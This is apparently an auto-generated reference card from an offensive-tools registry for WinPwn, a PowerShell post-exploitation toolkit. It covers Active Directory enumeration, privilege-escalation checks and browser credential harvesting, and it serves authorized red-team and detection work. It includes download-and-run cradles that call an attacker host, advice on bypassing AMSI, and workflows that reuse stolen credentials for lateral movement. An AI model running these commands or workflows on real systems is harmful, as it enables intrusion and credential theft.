---
name: WinPwn
description: PowerShell toolkit automating Windows and Active Directory
  post-exploitation, enumeration, and credential harvesting.
registry: registry
tool_id: winpwn
category: post-exploitation
tags:
  - post-exploitation
  - powershell
  - active-directory
  - credential-access
  - enumeration
  - windows
  - automation
mitre_techniques:
  - T1046
  - T1082
  - T1106
  - T1518
  - T1548.002
  - T1552.001
  - T1555
  - T1555.003
summary: "WinPwn is a PowerShell-based automation framework for Windows and AD
  post-exploitation. Invoke it only on compromised Windows hosts where you
  already have execution capability. It is a LOUD toolkit that executes multiple
  enumeration and credential-harvesting modules, generating extensive logs that
  EDR and SOC teams will detect. Use -noninteractive and -consoleoutput flags
  for non-interactive C2 execution; output will stream to console instead of
  creating loot folders on disk. Primary modules: -Localrecon (local system
  enumeration), -DomainRecon (AD enumeration including Bloodhound-style
  collection), -PowerSharpPack (in-memory .NET tools like Seatbelt, PowerUp,
  Watson). WinPwn bundles SessionGopher, browser credential extractors,
  sensitive file search, MSSQL enumeration, vulnerability checks (MS17-010,
  Zerologon, PrintNightmare, BlueKeep), and RBCD/GPO abuse checks. Expect
  detections from PowerShell ScriptBlock logging (Event ID 4104), process
  creation logs, and behavioral analytics. This tool is appropriate for
  authorized red team engagements or internal pentest scenarios where stealth is
  not required. Do NOT use if operational security matters; assume full
  visibility by defenders. WinPwn.ps1 must be loaded into memory or executed
  from disk; the tool does not persist itself. Output is verbose and includes
  successful/failed checks across all enabled modules. High false-positive rate
  in production due to aggressive enumeration. Ensure proper scoping and
  authorization before execution."
sources:
  - https://github.com/S3cur3Th1sSh1t/WinPwn
  - https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1
  - https://docs.datadoghq.com/security/default_rules/def-000-vzv/
  - https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_hktl_winpwn/
  - https://github.com/leesh3288/WinPwn/blob/master/README.md
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754340(v=ws.11)
  - https://ss64.com/nt/
  - https://www.bleepingcomputer.com/news/microsoft/microsoft-releases-a-windows-command-reference-for-over-250-console-commands/
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
  - https://redcanary.com/threat-detection-report/techniques/windows-command-shell/
  - https://sourceforge.net/projects/winpwn.mirror/
  - https://evalian.co.uk/penetration-testing-vs-red-team-testing/
generated_at: 2026-05-19T11:00:46.026Z
generated_by: anthropic
source_hash: f2bf1fa96b9ca7d26e08d6a9518834e48993ab9e3d0a038b01e0a23cfbc16b31
---

# WinPwn

## Overview

WinPwn is a comprehensive PowerShell post-exploitation automation framework for Windows and Active Directory environments. It consolidates reconnaissance, credential extraction, vulnerability scanning, and privilege escalation checks into a single toolkit. Originally designed for internal penetration testing, it integrates existing offensive tools (Seatbelt, Rubeus, Inveigh, PowerView, SessionGopher, etc.) and provides both interactive menus and non-interactive batch execution modes. WinPwn is installed at /opt/tools/WinPwn in RTPI but must be invoked on a compromised Windows target via command-and-control (C2) framework or interactive session. The toolkit is inherently noisy and designed for speed over stealth.

## When to use

Use WinPwn when you have already achieved code execution on a Windows host and need rapid, broad-spectrum enumeration and credential harvesting. It is appropriate for authorized red team engagements, internal penetration tests, or Active Directory security assessments where detection is acceptable or expected. Use it to quickly identify privilege escalation vectors, domain misconfigurations, cached credentials, vulnerable services, and lateral movement opportunities. Do NOT use WinPwn in stealth-required operations or against defensive-mature environments where you need to avoid detection—WinPwn will trigger PowerShell logging, EDR alerts, and behavioral detections. Reserve it for scenarios where you are testing detection and response capabilities or operating under assumptions of full visibility. Ideal for time-boxed engagements where comprehensive coverage trumps operational security.

## Authentication & setup

WinPwn requires no authentication or setup on the target—it is a PowerShell script executed in the context of the compromised user or system account. Ensure PowerShell execution policy permits script execution (bypass with 'powershell -ExecutionPolicy Bypass'). The script can be loaded from disk or injected into memory via IEX (Invoke-Expression) over HTTP/HTTPS. If using the -repo flag or helper scripts (Get_WinPwn_Repo.sh), you must host the WinPwn repository on an accessible web server (e.g., python3 -m http.server 8000) and pull dependencies dynamically. For C2 integration, upload WinPwn.ps1 to the target or execute it in-memory via download cradle (e.g., IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/WinPwn.ps1')). No privileges are required to execute most modules, but certain checks (e.g., privilege escalation, local admin enumeration) yield better results with elevated context. Ensure network connectivity if using remote repository downloads.

## Key commands / parameters

Primary invocation patterns:

- WinPwn -noninteractive -consoleoutput -Localrecon : Execute all local system enumeration modules (general info, PowerShell event log scraping, browser credentials, .NET binary search, SessionGopher, sensitive files). Output streams to console.

- WinPwn -noninteractive -consoleoutput -DomainRecon : Execute all AD enumeration modules (domain info, share enumeration, MSSQL discovery, vulnerability scans for MS17-010/Zerologon/PrintNightmare/BlueKeep, RBCD checks, GPO policies, Snaffler file discovery). Output streams to console.

- WinPwn -PowerSharpPack -consoleoutput -noninteractive : Execute in-memory .NET assemblies including Seatbelt (host enumeration), PowerUp (privilege escalation checks), Watson (patch level/exploit identification). Output streams to console.

- Dotnetsearch -consoleoutput -noninteractive : Search C:\Program Files\ and C:\Program Files (x86)\ for .NET assemblies that may be exploitable or useful for post-exploitation.

- Kittielocal -noninteractive -browsercredentials : Extract browser credentials specifically.

- Without flags, WinPwn launches an interactive menu system with numbered options (not suitable for C2 automation).

Key flags:
- -noninteractive : Suppresses prompts; runs modules with default or predefined parameters.
- -consoleoutput : Prevents creation of loot/report folders on disk; all output goes to stdout (critical for C2 stealth and log capture).
- -repo <URL> : Use a remote repository for loading modules and dependencies.

Individual functions can be called directly if WinPwn.ps1 is dot-sourced (e.g., . .\WinPwn.ps1; generalrecon -noninteractive -consoleoutput).

## Example workflows

Workflow 1 – Rapid local enumeration via C2:
1. Establish C2 session on compromised Windows host.
2. Upload or download WinPwn.ps1 into memory: execute-assembly or powershell IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/WinPwn.ps1'))
3. Run: WinPwn -noninteractive -consoleoutput -Localrecon
4. Capture console output in C2 agent logs; parse for credentials, sensitive files, PowerShell command history.
5. Prioritize findings: clear-text credentials, SSH keys, database connection strings, privilege escalation vectors.

Workflow 2 – Active Directory enumeration after domain user compromise:
1. Confirm domain context: whoami /all
2. Load WinPwn and execute: WinPwn -noninteractive -consoleoutput -DomainRecon
3. Parse output for: exploitable SMB shares, MSSQL instances, vulnerable domain controllers (Zerologon, MS17-010), RBCD-exploitable computer accounts, accessible GPO settings.
4. Export Bloodhound-compatible data if available or chain with SharpHound separately.
5. Use discovered MSSQL instances or shares for lateral movement or credential access.

Workflow 3 – In-memory .NET tool execution for privilege escalation checks:
1. Execute: WinPwn -PowerSharpPack -consoleoutput -noninteractive
2. Review Seatbelt output for unquoted service paths, AlwaysInstallElevated registry keys, autologon credentials.
3. Review PowerUp output for modifiable service binaries, weak file permissions.
4. Review Watson output for missing patches corresponding to known exploits (e.g., MS16-032, MS16-135).
5. Exploit identified vectors or escalate privileges accordingly.

Workflow 4 – Browser credential harvesting:
1. Execute: Kittielocal -noninteractive -browsercredentials
2. Extract saved passwords from Chrome, Firefox, Edge, IE.
3. Correlate credentials with internal web applications, VPNs, cloud services.
4. Use harvested credentials for lateral movement or external access.

## Output format

WinPwn output is verbose, human-readable text streamed to the PowerShell console or captured in log files. When using -consoleoutput, all results print to stdout in a structured but unformatted manner (no JSON, no CSV by default). Output includes:

- Module headers and timestamps (e.g., '================ WinPwn ================')
- Successful and failed checks with descriptive messages (e.g., 'Found credentials in PowerShell history', 'MS17-010 not detected')
- Enumerated objects: user lists, group memberships, shares, MSSQL instances, GPO policies, file paths, browser credential dumps
- Errors and exceptions (e.g., access denied, module not found)

Without -consoleoutput, WinPwn creates loot and report directories on disk (OPSEC risk). Credential dumps may include clear-text passwords, NTLM hashes, Kerberos tickets, SSH keys, and database connection strings. File search results include full paths to sensitive files (e.g., web.config, unattend.xml, .kdbx, .ppk). Vulnerability scan results include affected hostnames/IPs and CVE identifiers. Output length can exceed thousands of lines for domain reconnaissance; filter and parse programmatically (grep, Select-String) or ingest into log aggregation platforms.

## Common pitfalls

1. Detection and visibility: WinPwn is flagged by all major EDR vendors and PowerShell ScriptBlock logging (Event ID 4104). Sigma rules and behavioral analytics explicitly detect WinPwn execution patterns. Assume full blue team visibility.

2. Execution policy and AMSI: Windows Defender and AMSI may block WinPwn.ps1 execution or individual modules. Bypass AMSI before invocation or use obfuscated versions. Default execution policies may prevent script loading.

3. Disk artifacts: Without -consoleoutput, WinPwn writes loot folders and files to disk, leaving forensic evidence. Always use -consoleoutput for C2 operations.

4. Incomplete output capture: WinPwn generates massive console output. Ensure your C2 framework or logging mechanism can capture full stdout/stderr without truncation. Some modules may timeout or fail silently.

5. Module dependencies: Some WinPwn functions rely on external tools (e.g., Rubeus, Certify, ADRecon) that may not be present or accessible. If using -repo, ensure stable network connectivity to the hosting server; network interruptions will break execution.

6. Privilege context: Many checks require local administrator or domain privileges for complete results. Running as low-privilege user yields partial enumeration. Verify context before expecting comprehensive output.

7. Noisy network activity: Domain reconnaissance generates SMB traffic, LDAP queries, port scans, and Kerberos requests that will appear in network logs and may trigger IDS/IPS alerts.

8. False positives and irrelevant findings: WinPwn reports everything it finds, including non-exploitable misconfigurations or low-impact issues. Manually triage output for actionable findings.

9. Versioning and stability: WinPwn is community-maintained; modules may break with Windows updates or AD schema changes. Test in lab environments before operational use.

## References

- https://github.com/S3cur3Th1sSh1t/WinPwn
- https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1
- https://docs.datadoghq.com/security/default_rules/def-000-vzv/
- https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_hktl_winpwn/
- https://redcanary.com/threat-detection-report/techniques/windows-command-shell/
